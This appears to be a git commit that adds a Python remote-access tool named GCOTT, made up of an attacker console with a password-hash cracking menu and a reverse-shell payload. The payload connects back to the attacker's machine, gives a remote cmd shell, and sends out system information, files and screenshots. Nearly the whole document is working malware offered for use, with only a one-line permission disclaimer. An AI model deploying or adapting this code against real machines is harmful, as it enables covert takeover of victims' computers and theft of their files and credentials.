92ee10865ed6b0e921ff18b2a989e969e0492964
Alp Sina Başaran <109042942+HeavyBlue@users.noreply.github.com>
2025-04-16 22:55:33 +0300

    Add files via upload

---
+++ GCOTT/GCOTT.py
@@ -0,0 +1,122 @@
+import socket,json,base64,time,subprocess,pickle,gzip
+import os
+from termcolor import colored
+from art import *
+from password import Password_Cracker
+
+def listen(ip,port):
+    global target_ip,target_port
+    target_connection_ = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    target_connection_.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    target_connection_.bind((ip,port))
+    target_connection_.listen()
+    print("Listening...")
+    target_,target_adress = target_connection_.accept()
+    target_ip,target_port = target_adress
+    print(target_ip,target_port)
+    return target_,target_connection_
+def recive():
+    return target.recv(1024).decode()
+def clear():
+    subprocess.call('cmd.exe /c cls')
+def help():
+    print("-h/help: Show all option that you can use\nshow: Show all settings of connection\n-g/generate: Show generating payload menu\nset [OPTION_NAME]: set the option of connection\n-l/listen: Shwo listening optiion\nrun/execute: execute")
+def listen_help():
+    print("info: get information about target\ncwd: get current directory\nls: list directory\ncd: change directory EX: cd ../ cd [directory_name]\nuser: show user pemission\nget [File_Name]: get the file from target\n")
+def get_file(file_name):
+    with open(file_name,"wb") as file:
+        data=b''
+        while(True):
+            batchs=target.recv(1024)
+            if batchs==b"done":
+                print("done")
+                break
+            data+=batchs
+        file.write(data)
+
+at_sign = colored("@","green")
+quit_status = 0
+ss_num=0
+clear()
+ascii_art = text2art("GCOTT")
+print(ascii_art)
+print("Welcome To GCOTT\n This tool is for taking control of the target\n Please use this tool if only you have permission\n\n\nyou can see option with -help or -h\n\n")
+while True:
+    chapter = input("GCOTT -> ")
+    if chapter == "help" or chapter ==  "-h":
+        print("hell")
+        help()
+    if chapter =="listen" or chapter ==  "-l":
+        host_ip = socket.gethostbyname(socket.gethostname())
+        host_port = 5555
+        while True:  
+            option = input("GCOTT -> ")
+            if option == "show":
+                print("\n--------------------------\nHost_IP: ",host_ip,"\n--------------------------\nHost_Port: ",host_port,"\n--------------------------\n")
+            elif "set" in option:
+                set_option = option.split(" ")[1].split("_")[1].lower()
+                set_value = option.split(" ")[2]
+                if set_option =="ip":
+                    host_ip = set_value
+                elif set_option == "port":
+                    host_port = set_value
+            elif option =="execute" or option =="run":
+                target,target_connection = listen(host_ip,host_port)
+                target_ip = colored(target_ip,"red")
+                while True:
+                    command = input(str(target_ip)+at_sign+"GCOTT-> ")
+                    if command=="help" or command =="-h":
+                        listen_help()
+                    else:
+                        target.send(command.encode())
+                        if command =="info":
+                            info = target.recv(1024).decode().split("(")[1].split(")")[0].split(",")
+                            print(info[0],"\n",info[1],"\n",info[2],"\n",info[3],"\n",info[4],"\n")
+                        elif command =="cwd":
+                            print(target.recv(1024).decode())
+                        elif "cd" in command:
+                            if recive() =="0":
+                                print("Permission Denied!!!!!!!!")
+                        elif command =="ls":
+                            try:
+                                list_dir = eval(target.recv(10240).decode())   
+                                for i in list_dir:
+                                    print(i)
+                            except:
+                                print("dictionary size too big to show")
+                        elif command =="user":
+                            print(recive())
+                        elif command.split(" ")[0] =="get": 
+                            get_file(command.split("get ")[1])
+                        elif command == "screenshot":
+                            get_file("screenshot"+str(ss_num)+".png")
+                        elif command == "shell":
+                            shell_command = input(str(target_ip)+at_sign+"Shell:")
+                            target.send(shell_command.encode())
+                            while True:
+                                if shell_command=="quit":
+                                    break
+                                output = target.recv(4096)
+                                decompressed_data = gzip.decompress(output)
+                                original_data = str(pickle.loads(decompressed_data))
+                                if shell_command=="di2r":
+                                    original_data=original_data.split("\\r\\n")
+                                    for i in original_data:
+                                        print(i)
+                                else:
+                                    print(original_data)
+                                shell_command = input(str(target_ip)+at_sign+"Shell:")
+                                target.send(shell_command.encode())
+                        elif command == "q" or command == "quit":
+                            target_connection.close()
+                            break
+    elif chapter =="password" or chapter == "-p":
+        hashed_password = input("Enter the hashed password: ")
+        password_list_path = input("Enter the password list path: ")
+        hash_type = input("Enter the hash type: ")
+        randomness = input("Enter the randomness type(0/1): ")
+        cracker = Password_Cracker(hashed_password,password_list_path,hash_type,randomness)
+        result = cracker.crack()
+        print("Password => ",result)
+
+#target_connection.close()
---
+++ GCOTT/payloads/reverse shell.py
@@ -0,0 +1,78 @@
+import socket
+import subprocess,platform,os,getpass,json,base64,time,pickle,gzip,pyautogui
+
+def file_send(file_name):
+     global target
+     with open(file_name,"rb") as file:
+            data = file.read()
+            time.sleep(0.25)
+            batch_num = len(data)//1024
+            for i in range(batch_num):
+                batch=data[i*1024:(i+1)*1024]
+                target.send(batch)
+            batch=data[batch_num*1024:]
+            target.send(batch)
+            time.sleep(1)
+            target.send(("done").encode())
+
+target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+target.connect((socket.gethostbyname(socket.gethostname()),5555))
+#target.connect(("192.168.1.187",5555))
+while True:
+    recive = target.recv(1024).decode()
+    if recive =="info":
+        system_info = str(platform.uname())
+        target.send(system_info.encode())
+    elif recive =="cwd":
+        cwd = os.getcwd()
+        target.send(cwd.encode())
+    elif recive =="ls":
+        ls = str(os.listdir(os.getcwd()))
+        target.send(ls.encode())
+    elif "cd" in recive:
+        try:
+            os.chdir(recive.split("cd ")[1])
+            perm="1"
+            target.send(perm.encode())
+        except:
+            perm="0"
+            target.send(perm.encode())
+    elif recive=="user":
+        user = getpass.getuser()
+        target.send(user.encode())
+    elif recive.split(" ")[0] =="get":
+        print(recive.split("get ")[1])
+        file_send(recive.split("get ")[1])
+       
+    elif recive=="shell":
+        p = subprocess.Popen(['cmd'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        while True:
+            recive_cmd = target.recv(1024).decode()
+            print(recive_cmd)
+            if recive_cmd=="quit":
+                print("break while loop")
+                p.terminate()
+                break
+            else:
+                p.stdin.write(recive_cmd.encode())
+                p.stdin.write(b'\n')
+                p.stdin.flush()
+
+                output = p.stdout.readline().decode('cp1252')
+
+                # Çıktıyı byte'a çevirme
+                byte_data = pickle.dumps(output)
+                
+                # Byte veriyi gzip ile sıkıştırma
+                compressed_data = gzip.compress(byte_data)
+                
+                target.send(compressed_data)
+        
+    elif recive=="screenshot":
+        ss = pyautogui.screenshot()
+        ss.save("temp.png")
+        file_send("temp.png")
+        os.remove("temp.png")
+    elif recive=="q" or recive=="quit":
+        target.close()
+        break
